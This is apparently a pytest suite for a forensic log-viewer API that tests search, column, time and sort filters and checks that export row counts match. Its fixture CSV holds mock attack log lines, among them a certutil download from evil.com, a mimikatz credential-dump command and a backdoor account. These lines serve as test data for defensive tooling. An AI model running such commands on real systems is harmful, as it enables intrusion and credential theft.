"""
Chronos-DFIR — Comprehensive Filter Test Suite
Tests ALL filter types individually and in combination against the backend API.
Verifies export parity: grid row count == exported file row count.
"""
import csv
import io
import json
import os

import httpx
import pytest

# ── Config ─────────────────────────────────────────────────────────────────
BASE_URL = os.environ.get("CHRONOS_URL", "http://localhost:8000")
TIMEOUT = 30.0

# ── Test CSV Fixture ────────────────────────────────────────────────────────
TEST_CSV_CONTENT = """\
Time,EventID,Forensic_Category,User,SrcIP,DestIP,Description,HexField
2025-01-01 08:00:00,4624,Logon,admin,192.168.1.10,10.0.0.5,Successful logon via RDP,0xABCD1234
2025-01-01 09:30:00,4625,Failed Logon,hacker,192.168.1.100,10.0.0.5,Brute force attempt detected,0xFF00AA
2025-01-01 10:00:00,4688,Process Creation,admin,192.168.1.10,10.0.0.5,powershell.exe -enc base64string,0x00112233
2025-01-01 11:15:00,4672,Special Logon,SYSTEM,127.0.0.1,127.0.0.1,Special privileges assigned,0xDEADBEEF
2025-01-01 12:00:00,4688,Process Creation,user1,192.168.1.20,10.0.0.10,cmd.exe /c whoami,0x44556677
2025-01-02 08:00:00,4624,Logon,admin,192.168.1.10,10.0.0.5,Morning logon session,0xABCD1234
2025-01-02 09:00:00,4625,Failed Logon,attacker,10.10.10.50,10.0.0.5,SSH failed password,0x99887766
2025-01-02 10:30:00,4688,Process Creation,admin,192.168.1.10,10.0.0.5,certutil -urlcache -f http://evil.com,0xCAFEBABE
2025-01-02 11:00:00,1102,Log Clear,admin,192.168.1.10,10.0.0.5,Security log was cleared,0x11223344
2025-01-02 12:00:00,4624,Logon,user2,192.168.1.30,10.0.0.15,Normal user logon,0x55667788
2025-01-02 13:00:00,4625,Failed Logon,admin,192.168.1.200,10.0.0.5,Password expired,0xAABBCCDD
2025-01-02 14:00:00,4688,Process Creation,SYSTEM,127.0.0.1,127.0.0.1,svchost.exe starting service,0x00000001
2025-01-03 08:00:00,4624,Logon,admin,192.168.1.10,10.0.0.5,Third day logon,0xABCD1234
2025-01-03 09:00:00,7045,Service Install,admin,192.168.1.10,10.0.0.5,New service installed: backdoor.exe,0xBAADF00D
2025-01-03 10:00:00,4688,Process Creation,user1,192.168.1.20,10.0.0.10,notepad.exe opened,0x12345678
2025-01-03 11:00:00,4625,Failed Logon,root,10.10.10.99,10.0.0.5,Linux user attempted Windows logon,0xFEDCBA98
2025-01-03 12:00:00,4720,Account Created,admin,192.168.1.10,10.0.0.5,New local account: backdoor_admin,0x87654321
2025-01-03 13:00:00,4688,Process Creation,admin,192.168.1.10,10.0.0.5,mimikatz.exe sekurlsa::logonpasswords,0xDEADC0DE
2025-01-03 14:00:00,4648,Explicit Logon,admin,192.168.1.10,10.0.0.20,RunAs used for lateral movement,0x0BADF00D
2025-01-03 15:00:00,4624,Logon,user3,192.168.1.40,10.0.0.25,VPN logon from remote,0xC0FFEE00
"""

TOTAL_ROWS = 20  # Number of data rows in TEST_CSV_CONTENT


# ── Helpers ─────────────────────────────────────────────────────────────────

@pytest.fixture(scope="module")
def client():
    """HTTP client for the test session."""
    with httpx.Client(base_url=BASE_URL, timeout=TIMEOUT) as c:
        yield c


@pytest.fixture(scope="module")
def uploaded_filename(client):
    """Upload test CSV and return the filename assigned by the server."""
    # Create a temp CSV file
    csv_bytes = TEST_CSV_CONTENT.encode("utf-8")
    files = {"file": ("test_filter_suite.csv", io.BytesIO(csv_bytes), "text/csv")}
    data = {"artifact_type": "generic"}
    resp = client.post("/upload", files=files, data=data)
    assert resp.status_code == 200, f"Upload failed: {resp.text}"
    result = resp.json()
    assert result.get("status") == "success", f"Upload error: {result}"
    filename = result["csv_filename"]
    print(f"\n[FIXTURE] Uploaded test file: {filename}")
    return filename


def get_grid_data(client, filename, **params):
    """Fetch paginated grid data, returns (total_unfiltered, total_filtered, data_rows)."""
    default = {"page": 1, "size": 500}
    default.update(params)
    resp = client.get(f"/api/data/{filename}", params=default)
    assert resp.status_code == 200, f"GET /api/data failed: {resp.text}"
    j = resp.json()
    return j.get("total_unfiltered", j["total"]), j["total"], j.get("data", [])


def export_filtered(client, filename, format="csv", **params):
    """POST to /api/export_filtered, download the file, return row count + content."""
    payload = {
        "filename": filename,
        "format": format,
        "query": params.get("query", ""),
        "start_time": params.get("start_time", ""),
        "end_time": params.get("end_time", ""),
        "col_filters": params.get("col_filters", "[]"),
        "selected_ids": params.get("selected_ids", []),
        "visible_columns": params.get("visible_columns", []),
        "sort_col": params.get("sort_col"),
        "sort_dir": params.get("sort_dir"),
    }
    resp = client.post("/api/export_filtered", json=payload)
    assert resp.status_code == 200, f"Export request failed: {resp.text}"
    result = resp.json()
    assert "download_url" in result, f"No download_url: {result}"

    # Download the file
    dl_resp = client.get(result["download_url"])
    assert dl_resp.status_code == 200, f"Download failed: {dl_resp.status_code}"
    return result, dl_resp.content


def count_csv_rows(content: bytes) -> int:
    """Count data rows in CSV content (excluding header)."""
    text = content.decode("utf-8-sig")  # Handle BOM
    reader = csv.reader(io.StringIO(text))
    rows = list(reader)
    return len(rows) - 1  # subtract header


def count_json_rows(content: bytes) -> int:
    """Count items in JSON array export."""
    data = json.loads(content.decode("utf-8"))
    return len(data)


# ═══════════════════════════════════════════════════════════════════════════
# 1. INDIVIDUAL FILTER TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestGlobalSearch:
    """Test global search (query parameter) — token-based AND logic."""

    def test_single_token(self, client, uploaded_filename):
        """Single search term reduces results."""
        unfiltered, filtered, data = get_grid_data(client, uploaded_filename, query="admin")
        assert unfiltered == TOTAL_ROWS
        assert filtered < unfiltered, "Global search 'admin' should filter rows"
        assert filtered > 0, "Should find at least one match"
        for row in data:
            row_str = " ".join(str(v) for v in row.values()).lower()
            assert "admin" in row_str, f"Row doesn't contain 'admin': {row}"

    def test_multi_token_and(self, client, uploaded_filename):
        """Multiple tokens apply AND logic."""
        _, single, _ = get_grid_data(client, uploaded_filename, query="admin")
        _, multi, _ = get_grid_data(client, uploaded_filename, query="admin logon")
        assert multi <= single, "AND logic: more tokens = same or fewer results"
        assert multi > 0, "Should still find matches for admin+logon"

    def test_no_results(self, client, uploaded_filename):
        """Search for nonexistent term returns zero."""
        _, filtered, data = get_grid_data(client, uploaded_filename, query="zzz_nonexistent_xyz")
        assert filtered == 0
        assert len(data) == 0

    def test_empty_query_returns_all(self, client, uploaded_filename):
        """Empty query returns all records."""
        _, filtered, _ = get_grid_data(client, uploaded_filename, query="")
        assert filtered == TOTAL_ROWS


class TestColumnFilters:
    """Test per-column header filters (col_filters parameter)."""

    def test_like_filter(self, client, uploaded_filename):
        """Substring match (default 'like' type)."""
        col_filters = json.dumps([{"field": "Forensic_Category", "type": "like", "value": "Logon"}])
        _, filtered, data = get_grid_data(client, uploaded_filename, col_filters=col_filters)
        assert filtered > 0
        for row in data:
            assert "logon" in row.get("Forensic_Category", "").lower()

    def test_equals_filter(self, client, uploaded_filename):
        """Exact match filter."""
        col_filters = json.dumps([{"field": "EventID", "type": "=", "value": "4624"}])
        _, filtered, data = get_grid_data(client, uploaded_filename, col_filters=col_filters)
        assert filtered > 0
        for row in data:
            assert str(row.get("EventID", "")) == "4624"

    def test_not_equals_filter(self, client, uploaded_filename):
        """Not-equals filter."""
        col_filters = json.dumps([{"field": "EventID", "type": "!=", "value": "4624"}])
        _, filtered, _ = get_grid_data(client, uploaded_filename, col_filters=col_filters)
        # 4624 appears 5 times, so filtered should be TOTAL - 5
        _, eq_count, _ = get_grid_data(client, uploaded_filename,
                                        col_filters=json.dumps([{"field": "EventID", "type": "=", "value": "4624"}]))
        assert filtered == TOTAL_ROWS - eq_count

    def test_greater_than_filter(self, client, uploaded_filename):
        """Numeric greater-than filter."""
        col_filters = json.dumps([{"field": "EventID", "type": ">", "value": "4688"}])
        _, filtered, data = get_grid_data(client, uploaded_filename, col_filters=col_filters)
        assert filtered > 0
        for row in data:
            assert int(row.get("EventID", 0)) > 4688

    def test_multiple_column_filters(self, client, uploaded_filename):
        """Two column filters = AND."""
        cf = json.dumps([
            {"field": "Forensic_Category", "type": "like", "value": "Process"},
            {"field": "User", "type": "=", "value": "admin"}
        ])
        _, filtered, data = get_grid_data(client, uploaded_filename, col_filters=cf)
        assert filtered > 0
        for row in data:
            assert "process" in row.get("Forensic_Category", "").lower()
            assert row.get("User", "") == "admin"

    def test_nonexistent_column_graceful(self, client, uploaded_filename):
        """Filter on nonexistent column returns an error (500 from Polars)."""
        cf = json.dumps([{"field": "DOES_NOT_EXIST", "type": "like", "value": "test"}])
        resp = client.get(f"/api/data/{uploaded_filename}", params={"page": 1, "size": 500, "col_filters": cf})
        # Polars raises ColumnNotFoundError → backend returns 500
        assert resp.status_code in [200, 400, 422, 500]


class TestTimeFilter:
    """Test time range filtering."""

    def test_time_range_narrows(self, client, uploaded_filename):
        """Setting a time range reduces results."""
        _, all_count, _ = get_grid_data(client, uploaded_filename)
        _, filtered, data = get_grid_data(client, uploaded_filename,
                                           start_time="2025-01-01 08:00:00",
                                           end_time="2025-01-01 12:00:00")
        assert filtered < all_count, "Time filter should narrow results"
        assert filtered == 5, "Should have exactly 5 events on Jan 1"

    def test_single_day(self, client, uploaded_filename):
        """Filter to a single day."""
        _, filtered, _ = get_grid_data(client, uploaded_filename,
                                        start_time="2025-01-02 00:00:00",
                                        end_time="2025-01-02 23:59:59")
        assert filtered == 7, "Jan 2 should have 7 events"

    def test_time_range_empty(self, client, uploaded_filename):
        """Time range with no matching events."""
        _, filtered, data = get_grid_data(client, uploaded_filename,
                                           start_time="2024-01-01 00:00:00",
                                           end_time="2024-01-01 23:59:59")
        assert filtered == 0


class TestSelectedIds:
    """Test selected_ids filtering (export path)."""

    def test_export_selected_ids_only(self, client, uploaded_filename):
        """Export with selected_ids returns only those rows."""
        result, content = export_filtered(client, uploaded_filename,
                                           format="csv",
                                           selected_ids=[1, 3, 5])
        row_count = count_csv_rows(content)
        assert row_count == 3, f"Expected 3 rows for 3 selected IDs, got {row_count}"

    def test_export_selected_renumbered(self, client, uploaded_filename):
        """Selected exports renumber to 1,2,3..."""
        result, content = export_filtered(client, uploaded_filename,
                                           format="json",
                                           selected_ids=[5, 10, 15])
        rows = json.loads(content.decode("utf-8"))
        nos = [r.get("No.") for r in rows]
        assert nos == [1, 2, 3] or nos == ["1", "2", "3"], f"Expected 1,2,3 but got {nos}"


# ═══════════════════════════════════════════════════════════════════════════
# 2. FILTER COMBINATION TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestFilterCombinations:
    """Test that multiple filters stack correctly (AND behavior)."""

    def test_global_plus_column(self, client, uploaded_filename):
        """Global search + column filter = tighter results."""
        _, global_only, _ = get_grid_data(client, uploaded_filename, query="admin")
        cf = json.dumps([{"field": "Forensic_Category", "type": "like", "value": "Logon"}])
        _, col_only, _ = get_grid_data(client, uploaded_filename, col_filters=cf)
        _, combined, _ = get_grid_data(client, uploaded_filename, query="admin", col_filters=cf)
        assert combined <= min(global_only, col_only), "Combined should be <= each individual filter"
        assert combined > 0

    def test_global_plus_time(self, client, uploaded_filename):
        """Global search + time range."""
        _, time_only, _ = get_grid_data(client, uploaded_filename,
                                         start_time="2025-01-01 00:00:00",
                                         end_time="2025-01-01 23:59:59")
        _, combined, _ = get_grid_data(client, uploaded_filename,
                                        query="admin",
                                        start_time="2025-01-01 00:00:00",
                                        end_time="2025-01-01 23:59:59")
        assert combined <= time_only

    def test_column_plus_time(self, client, uploaded_filename):
        """Column filter + time range."""
        cf = json.dumps([{"field": "EventID", "type": "=", "value": "4688"}])
        _, col_only, _ = get_grid_data(client, uploaded_filename, col_filters=cf)
        _, combined, data = get_grid_data(client, uploaded_filename,
                                           col_filters=cf,
                                           start_time="2025-01-01 00:00:00",
                                           end_time="2025-01-01 23:59:59")
        assert combined <= col_only
        for row in data:
            assert str(row.get("EventID", "")) == "4688"

    def test_all_three_filters(self, client, uploaded_filename):
        """Global search + column filter + time range = maximum restriction."""
        cf = json.dumps([{"field": "Forensic_Category", "type": "like", "value": "Process"}])
        _, combined, data = get_grid_data(client, uploaded_filename,
                                           query="admin",
                                           col_filters=cf,
                                           start_time="2025-01-01 00:00:00",
                                           end_time="2025-01-02 23:59:59")
        assert combined > 0, "Should find admin Process Creation events in first 2 days"
        for row in data:
            assert "process" in row.get("Forensic_Category", "").lower()
            row_str = " ".join(str(v) for v in row.values()).lower()
            assert "admin" in row_str

    def test_all_filters_plus_selected_ids(self, client, uploaded_filename):
        """All filters + selected_ids for export."""
        cf = json.dumps([{"field": "EventID", "type": "=", "value": "4624"}])
        # First get the filtered grid to know which IDs are available
        _, filtered, data = get_grid_data(client, uploaded_filename,
                                           query="admin", col_filters=cf)
        if filtered > 0:
            available_ids = [row["_id"] for row in data if "_id" in row]
            if len(available_ids) >= 2:
                # Export only first 2 of the filtered set
                result, content = export_filtered(client, uploaded_filename,
                                                   format="csv",
                                                   query="admin",
                                                   col_filters=cf,
                                                   selected_ids=available_ids[:2])
                row_count = count_csv_rows(content)
                assert row_count == 2


# ═══════════════════════════════════════════════════════════════════════════
# 3. EXPORT PARITY TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestExportParity:
    """Verify that grid total == exported file row count for same filters."""

    def _check_parity(self, client, filename, format, **filter_params):
        """Helper: compare grid count with export row count."""
        _, grid_total, _ = get_grid_data(client, filename, **filter_params)
        result, content = export_filtered(client, filename, format=format, **filter_params)

        if format == "csv":
            export_count = count_csv_rows(content)
        elif format == "json":
            export_count = count_json_rows(content)
        else:
            return  # XLSX is binary, skip count for now

        assert export_count == grid_total, (
            f"PARITY MISMATCH ({format}): grid={grid_total}, export={export_count} "
            f"with filters={filter_params}"
        )

    def test_no_filter_csv(self, client, uploaded_filename):
        self._check_parity(client, uploaded_filename, "csv")

    def test_no_filter_json(self, client, uploaded_filename):
        self._check_parity(client, uploaded_filename, "json")

    def test_global_search_csv(self, client, uploaded_filename):
        self._check_parity(client, uploaded_filename, "csv", query="admin")

    def test_global_search_json(self, client, uploaded_filename):
        self._check_parity(client, uploaded_filename, "json", query="admin")

    def test_column_filter_csv(self, client, uploaded_filename):
        cf = json.dumps([{"field": "EventID", "type": "=", "value": "4688"}])
        self._check_parity(client, uploaded_filename, "csv", col_filters=cf)

    def test_time_filter_csv(self, client, uploaded_filename):
        self._check_parity(client, uploaded_filename, "csv",
                           start_time="2025-01-02 00:00:00",
                           end_time="2025-01-02 23:59:59")

    def test_combined_filters_csv(self, client, uploaded_filename):
        cf = json.dumps([{"field": "Forensic_Category", "type": "like", "value": "Logon"}])
        self._check_parity(client, uploaded_filename, "csv",
                           query="admin", col_filters=cf,
                           start_time="2025-01-01 00:00:00",
                           end_time="2025-01-02 23:59:59")

    def test_combined_filters_json(self, client, uploaded_filename):
        cf = json.dumps([{"field": "Forensic_Category", "type": "like", "value": "Logon"}])
        self._check_parity(client, uploaded_filename, "json",
                           query="admin", col_filters=cf,
                           start_time="2025-01-01 00:00:00",
                           end_time="2025-01-02 23:59:59")

    def test_empty_result_csv(self, client, uploaded_filename):
        """Export with no matching rows should have 0 data rows."""
        result, content = export_filtered(client, uploaded_filename,
                                           format="csv",
                                           query="zzz_nonexistent_xyz")
        row_count = count_csv_rows(content)
        assert row_count == 0, f"Expected 0 rows for nonexistent query, got {row_count}"


# ═══════════════════════════════════════════════════════════════════════════
# 4. VISIBLE COLUMNS TEST
# ═══════════════════════════════════════════════════════════════════════════

class TestVisibleColumns:
    """Test that visible_columns parameter filters exported columns."""

    def test_visible_columns_csv(self, client, uploaded_filename):
        """Only specified columns appear in CSV export."""
        target_cols = ["No.", "Time", "EventID", "User"]
        result, content = export_filtered(client, uploaded_filename,
                                           format="csv",
                                           visible_columns=target_cols)
        text = content.decode("utf-8-sig")
        reader = csv.reader(io.StringIO(text))
        header = next(reader)
        assert header == target_cols, f"Expected columns {target_cols}, got {header}"

    def test_visible_columns_json(self, client, uploaded_filename):
        """Only specified columns appear in JSON export."""
        target_cols = ["No.", "Time", "User"]
        result, content = export_filtered(client, uploaded_filename,
                                           format="json",
                                           visible_columns=target_cols)
        rows = json.loads(content.decode("utf-8"))
        if rows:
            keys = set(rows[0].keys())
            expected_keys = {"No.", "Time", "User"}
            assert keys == expected_keys, f"Expected keys {expected_keys}, got {keys}"


# ═══════════════════════════════════════════════════════════════════════════
# 5. SORT + FILTER TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestSortWithFilters:
    """Verify that sorting works correctly combined with filters."""

    def test_sort_asc(self, client, uploaded_filename):
        """Sort by EventID ascending."""
        _, _, data = get_grid_data(client, uploaded_filename,
                                    **{"sort[0][field]": "EventID", "sort[0][dir]": "asc"})
        ids = [str(row.get("EventID", "")) for row in data]
        assert ids == sorted(ids, key=lambda x: int(x) if x.isdigit() else 0)

    def test_sort_desc_with_filter(self, client, uploaded_filename):
        """Sort desc + column filter."""
        cf = json.dumps([{"field": "Forensic_Category", "type": "like", "value": "Logon"}])
        _, _, data = get_grid_data(client, uploaded_filename,
                                    col_filters=cf,
                                    **{"sort[0][field]": "EventID", "sort[0][dir]": "desc"})
        ids = [int(row.get("EventID", 0)) for row in data]
        assert ids == sorted(ids, reverse=True)

    def test_sort_export_parity(self, client, uploaded_filename):
        """Exported file respects sort order."""
        result, content = export_filtered(client, uploaded_filename,
                                           format="csv",
                                           sort_col="EventID",
                                           sort_dir="asc")
        text = content.decode("utf-8-sig")
        reader = csv.reader(io.StringIO(text))
        header = next(reader)
        eid_idx = header.index("EventID") if "EventID" in header else None
        if eid_idx is not None:
            ids = [row[eid_idx] for row in reader if row]
            numeric_ids = [int(x) for x in ids if x.isdigit()]
            assert numeric_ids == sorted(numeric_ids), "Export should respect sort order"


# ═══════════════════════════════════════════════════════════════════════════
# 6. EDGE CASES
# ═══════════════════════════════════════════════════════════════════════════

class TestEdgeCases:
    """Edge cases: hex values, special chars, empty results."""

    def test_hex_preserved_in_export(self, client, uploaded_filename):
        """Hex values (0x...) should NOT be converted to numbers."""
        result, content = export_filtered(client, uploaded_filename, format="csv")
        text = content.decode("utf-8-sig")
        assert "0xABCD1234" in text, "Hex value should be preserved verbatim"
        assert "0xDEADBEEF" in text, "Hex value should be preserved verbatim"

    def test_search_special_chars(self, client, uploaded_filename):
        """Search with special regex chars doesn't crash."""
        # These should be treated as literal strings, not regex
        for query in ["192.168.1.10", "cmd.exe", "/c", "()"]:
            resp = client.get(f"/api/data/{uploaded_filename}",
                              params={"page": 1, "size": 500, "query": query})
            assert resp.status_code == 200, f"Search '{query}' crashed: {resp.status_code}"

    def test_empty_columns_endpoint(self, client, uploaded_filename):
        """GET /api/empty_columns returns valid response."""
        resp = client.get(f"/api/empty_columns/{uploaded_filename}")
        assert resp.status_code == 200
        data = resp.json()
        # Our test CSV has no empty columns
        assert "empty_columns" in data

    def test_histogram_subset_with_filters(self, client, uploaded_filename):
        """POST /api/histogram_subset now accepts filter params."""
        payload = {
            "filename": uploaded_filename,
            "selected_ids": [1, 2, 3],
            "query": "admin",
            "start_time": "",
            "end_time": "",
            "col_filters": "[]"
        }
        resp = client.post("/api/histogram_subset", json=payload)
        assert resp.status_code == 200, f"Histogram subset failed: {resp.text}"


# ═══════════════════════════════════════════════════════════════════════════
# 7. XLSX EXPORT TEST
# ═══════════════════════════════════════════════════════════════════════════

class TestXlsxExport:
    """Test XLSX export works and returns a valid file."""

    def test_xlsx_export_basic(self, client, uploaded_filename):
        """XLSX export returns a downloadable file."""
        result, content = export_filtered(client, uploaded_filename, format="xlsx")
        # XLSX files start with PK (zip format)
        assert content[:2] == b"PK", "XLSX should be a zip/office file"
        assert len(content) > 100, "XLSX file seems too small"

    def test_xlsx_export_with_filters(self, client, uploaded_filename):
        """XLSX export with filters produces a valid file."""
        cf = json.dumps([{"field": "EventID", "type": "=", "value": "4624"}])
        result, content = export_filtered(client, uploaded_filename,
                                           format="xlsx",
                                           query="admin",
                                           col_filters=cf)
        assert content[:2] == b"PK"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
